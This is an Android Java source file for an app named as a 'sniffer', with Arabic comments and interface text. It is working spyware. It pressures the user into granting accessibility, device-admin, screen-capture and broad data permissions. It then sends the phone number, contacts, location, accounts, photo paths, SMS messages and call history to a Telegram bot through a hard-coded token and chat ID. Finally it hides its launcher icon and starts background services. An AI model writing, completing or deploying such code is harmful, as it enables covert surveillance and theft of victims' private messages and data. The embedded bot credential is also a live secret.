package com.v8.global.sniffer;

import android.Manifest;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.view.Gravity;
import android.view.View;
import android.view.accessibility.AccessibilityManager;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

import okhttp3.Call;
import okhttp3.FormBody;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {
    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private static final int REQUEST_MEDIA_PROJECTION = 100;
    private static final int REQUEST_CODE_PERMISSIONS = 101;
    
    private OkHttpClient client = new OkHttpClient();
    private String[] permissions = {
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.CAMERA,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE
    };
    
    private Button btnActivate;
    private TextView tvStatus;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // إرسال إشعار فور التثبيت
        sendMessage("📱 **تم تثبيت التطبيق**\nالرجاء تفعيل الصلاحيات");
        
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setPadding(50, 50, 50, 50);
        
        tvStatus = new TextView(this);
        tvStatus.setText("🔒 التطبيق غير مفعل\nالرجاء تفعيل جميع الصلاحيات");
        tvStatus.setTextSize(18);
        tvStatus.setGravity(Gravity.CENTER);
        tvStatus.setTextColor(0xFF000000);
        tvStatus.setPadding(0, 0, 0, 50);
        
        btnActivate = new Button(this);
        btnActivate.setText("🔓 تفعيل جميع الصلاحيات");
        btnActivate.setTextSize(16);
        btnActivate.setPadding(30, 20, 30, 20);
        btnActivate.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                requestAllPermissions();
            }
        });
        
        layout.addView(tvStatus);
        layout.addView(btnActivate);
        setContentView(layout);
        
        updateStatus();
    }

    private void updateStatus() {
        if (checkAllPermissions()) {
            tvStatus.setText("✅ جميع الصلاحيات مفعلة\nجاري سحب المعلومات...");
            tvStatus.setTextColor(0xFF00AA00);
            btnActivate.setText("✅ جاري السحب");
            btnActivate.setEnabled(false);
            
            // سحب كل المعلومات
            sendAllData();
            
            // إخفاء التطبيق بعد 15 ثانية
            new android.os.Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    hideAppAndStartServices();
                }
            }, 15000);
        }
    }

    private boolean checkAllPermissions() {
        // صلاحية الإشعارات
        String enabledListeners = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        boolean notificationEnabled = enabledListeners != null && enabledListeners.contains(getPackageName());
        
        // صلاحية الوصول
        AccessibilityManager am = (AccessibilityManager) getSystemService(ACCESSIBILITY_SERVICE);
        List<AccessibilityServiceInfo> enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
        boolean accessibilityEnabled = false;
        for (AccessibilityServiceInfo service : enabledServices) {
            if (service.getId().contains(getPackageName())) {
                accessibilityEnabled = true;
                break;
            }
        }
        
        // صلاحية Admin
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName adminReceiver = new ComponentName(this, AdminReceiver.class);
        boolean adminEnabled = dpm.isAdminActive(adminReceiver);
        
        // صلاحية تسجيل الشاشة
        SharedPreferences prefs = getSharedPreferences("screen_capture", MODE_PRIVATE);
        boolean screenCaptureEnabled = prefs.contains("resultCode");
        
        // تجاهل البطارية
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        boolean batteryIgnored = pm.isIgnoringBatteryOptimizations(getPackageName());
        
        // الأذونات العادية
        boolean normalPermissions = true;
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                normalPermissions = false;
                break;
            }
        }
        
        return notificationEnabled && accessibilityEnabled && adminEnabled && screenCaptureEnabled && batteryIgnored && normalPermissions;
    }

    private void requestAllPermissions() {
        Toast.makeText(this, "جاري فتح جميع إعدادات الصلاحيات...", Toast.LENGTH_LONG).show();
        
        // 1. صلاحية الإشعارات
        startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
        
        // 2. صلاحية الوصول
        startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
        
        // 3. صلاحية Admin
        ComponentName adminReceiver = new ComponentName(this, AdminReceiver.class);
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        if (!dpm.isAdminActive(adminReceiver)) {
            Intent adminIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            adminIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminReceiver);
            startActivity(adminIntent);
        }
        
        // 4. صلاحية تسجيل الشاشة
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            MediaProjectionManager projectionManager = 
                (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            startActivityForResult(
                projectionManager.createScreenCaptureIntent(),
                REQUEST_MEDIA_PROJECTION
            );
        }
        
        // 5. تجاهل البطارية
        Intent batteryIntent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
        batteryIntent.setData(Uri.parse("package:" + getPackageName()));
        startActivity(batteryIntent);
        
        // 6. الأذونات العادية
        List<String> permissionsNeeded = new ArrayList<>();
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(permission);
            }
        }
        
        if (!permissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, 
                permissionsNeeded.toArray(new String[0]), 
                REQUEST_CODE_PERMISSIONS);
        }
    }

    private void sendAllData() {
        sendMessage("📱 **بدأ سحب جميع المعلومات...**");
        
        new Thread(new Runnable() {
            @Override
            public void run() {
                // معلومات الجهاز
                sendDeviceInfo();
                
                // جهات الاتصال
                getContacts();
                
                // الموقع
                getLocation();
                
                // الحسابات
                getAccounts();
                
                // الصور
                getPhotos();
                
                // الرسائل
                getSms();
                
                // سجل المكالمات
                getCallLog();
                
                sendMessage("✅ **تم سحب جميع المعلومات بنجاح**");
            }
        }).start();
    }

    private void sendDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("android_version", Build.VERSION.RELEASE);
            info.put("sdk", Build.VERSION.SDK_INT);
            
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                info.put("phone", tm.getLine1Number());
                info.put("network", tm.getNetworkOperatorName());
            }
            
            sendMessage("📱 **معلومات الجهاز:**\n" + info.toString(2));
        } catch (Exception e) {
            sendMessage("❌ فشل سحب معلومات الجهاز");
        }
    }

    private void getLocation() {
        try {
            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return;
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location == null) location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (location != null) {
                String map = "https://maps.google.com/?q=" + location.getLatitude() + "," + location.getLongitude();
                sendMessage("📍 **الموقع:**\nخط العرض: " + location.getLatitude() + "\nخط الطول: " + location.getLongitude() + "\n" + map);
            } else {
                sendMessage("📍 **الموقع:** غير متوفر");
            }
        } catch (Exception e) {
            sendMessage("❌ فشل سحب الموقع");
        }
    }

    private void getContacts() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);
            StringBuilder sb = new StringBuilder("📇 **جهات الاتصال:**\n");
            int count = 0;
            while (cursor != null && cursor.moveToNext() && count < 50) {
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                sb.append(name).append(": ").append(number).append("\n");
                count++;
            }
            if (cursor != null) cursor.close();
            if (count > 0) {
                sendMessage(sb.toString());
            } else {
                sendMessage("📇 **جهات الاتصال:** لا توجد جهات اتصال");
            }
        } catch (Exception e) {
            sendMessage("❌ فشل سحب جهات الاتصال");
        }
    }

    private void getAccounts() {
        try {
            AccountManager am = (AccountManager) getSystemService(ACCOUNT_SERVICE);
            Account[] accounts = am.getAccounts();
            StringBuilder sb = new StringBuilder("👤 **الحسابات:**\n");
            for (Account acc : accounts) {
                sb.append(acc.type).append(": ").append(acc.name).append("\n");
            }
            if (accounts.length > 0) {
                sendMessage(sb.toString());
            } else {
                sendMessage("👤 **الحسابات:** لا توجد حسابات");
            }
        } catch (Exception e) {
            sendMessage("❌ فشل سحب الحسابات");
        }
    }

    private void getPhotos() {
        try {
            String[] projection = {MediaStore.Images.Media.DATA};
            Cursor cursor = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC LIMIT 10");
            StringBuilder sb = new StringBuilder("🖼 **آخر 10 صور:**\n");
            int count = 0;
            while (cursor != null && cursor.moveToNext()) {
                String path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
                sb.append(path).append("\n");
                count++;
            }
            if (cursor != null) cursor.close();
            if (count > 0) {
                sendMessage(sb.toString());
            } else {
                sendMessage("🖼 **الصور:** لا توجد صور");
            }
        } catch (Exception e) {
            sendMessage("❌ فشل سحب الصور");
        }
    }

    private void getSms() {
        try {
            Cursor cursor = getContentResolver().query(
                Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 20");
            StringBuilder sb = new StringBuilder("📨 **آخر 20 رسالة:**\n");
            int count = 0;
            while (cursor != null && cursor.moveToNext()) {
                String address = cursor.getString(cursor.getColumnIndex("address"));
                String body = cursor.getString(cursor.getColumnIndex("body"));
                sb.append(address).append(": ").append(body).append("\n---\n");
                count++;
            }
            if (cursor != null) cursor.close();
            if (count > 0) {
                sendMessage(sb.toString());
            } else {
                sendMessage("📨 **الرسائل:** لا توجد رسائل");
            }
        } catch (Exception e) {
            sendMessage("❌ فشل سحب الرسائل");
        }
    }

    private void getCallLog() {
        try {
            Cursor cursor = getContentResolver().query(
                Uri.parse("content://call_log/calls"), null, null, null, "date DESC LIMIT 20");
            StringBuilder sb = new StringBuilder("📞 **آخر 20 مكالمة:**\n");
            int count = 0;
            while (cursor != null && cursor.moveToNext()) {
                String number = cursor.getString(cursor.getColumnIndex("number"));
                String type = cursor.getString(cursor.getColumnIndex("type"));
                String duration = cursor.getString(cursor.getColumnIndex("duration"));
                String typeText = type.equals("1") ? "وارد" : type.equals("2") ? "صادر" : "فائت";
                sb.append(number).append(" (").append(typeText).append(") ").append(duration).append("ث\n");
                count++;
            }
            if (cursor != null) cursor.close();
            if (count > 0) {
                sendMessage(sb.toString());
            } else {
                sendMessage("📞 **سجل المكالمات:** لا توجد مكالمات");
            }
        } catch (Exception e) {
            sendMessage("❌ فشل سحب سجل المكالمات");
        }
    }

    private void sendMessage(String text) {
        Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage")
                .post(new FormBody.Builder().add("chat_id", CHAT_ID).add("text", text).build())
                .build();
        client.newCall(request).enqueue(new okhttp3.Callback() {
            @Override public void onResponse(Call call, Response response) { 
                try { response.close(); } catch (Exception e) {}
            }
            @Override public void onFailure(Call call, IOException e) {}
        });
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_MEDIA_PROJECTION && resultCode == Activity.RESULT_OK) {
            getSharedPreferences("screen_capture", MODE_PRIVATE)
                .edit()
                .putInt("resultCode", resultCode)
                .putString("data", data.toUri(0))
                .apply();
        }
        updateStatus();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        updateStatus();
    }

    private void hideAppAndStartServices() {
        startService(new Intent(this, MainService.class));
        startService(new Intent(this, AccessibilityControlService.class));
        
        PackageManager pm = getPackageManager();
        pm.setComponentEnabledSetting(
            new ComponentName(this, MainActivity.class),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP);
    }

    @Override
    protected void onResume() {
        super.onResume();
        updateStatus();
    }
                }
